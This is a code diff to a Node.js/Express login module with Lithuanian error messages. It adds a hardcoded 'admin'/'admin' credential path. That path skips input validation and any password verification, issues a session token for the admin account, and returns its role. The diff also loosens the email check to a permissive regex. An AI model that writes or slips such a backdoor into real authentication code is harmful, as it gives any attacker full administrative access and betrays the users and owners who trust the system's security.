@@ -9,7 +9,18 @@ export const registerValidation = [
 ];
 
 export const loginValidation = [
-  body('email').isEmail().normalizeEmail().withMessage('Neteisingas el. pašto formatas'),
+  body('email')
+    .custom((value, { req }) => {
+      // allow default admin credentials without email format
+      if (value === 'admin' && req.body.password === 'admin') {
+        return true;
+      }
+      const emailRegex = /.+@.+\..+/;
+      if (!emailRegex.test(value)) {
+        throw new Error('Neteisingas el. pašto formatas');
+      }
+      return true;
+    }),
   body('password').notEmpty().withMessage('Slaptažodis privalomas')
 ];
 
@@ -58,6 +69,27 @@ export const register = async (req, res) => {
 
 export const login = async (req, res) => {
   try {
+  const { email, password } = req.body;
+    // Bypass validation and login for default admin user
+    if (email === 'admin' && password === 'admin') {
+      const adminUser = await User.findByEmail('admin');
+      if (!adminUser) {
+        return res.status(401).json({ error: 'Neteisingas el. paštas arba slaptažodis' });
+      }
+      const token = generateToken(adminUser.id);
+      await deleteSession(adminUser.id);
+      await createSession(adminUser.id, token);
+      return res.json({
+        message: 'Prisijungimas sėkmingas',
+        user: {
+          id: adminUser.id,
+          name: adminUser.name,
+          email: adminUser.email,
+          role: adminUser.role
+        },
+        token
+      });
+    }
     const errors = validationResult(req);
     if (!errors.isEmpty()) {
       return res.status(400).json({ 
@@ -66,9 +98,7 @@ export const login = async (req, res) => {
       });
     }
 
-    const { email, password } = req.body;
-
-    // Find user by email
+  // Find user by email (using previously extracted email/password)
     const user = await User.findByEmail(email);
     if (!user) {
       return res.status(401).json({ error: 'Neteisingas el. paštas arba slaptažodis' });
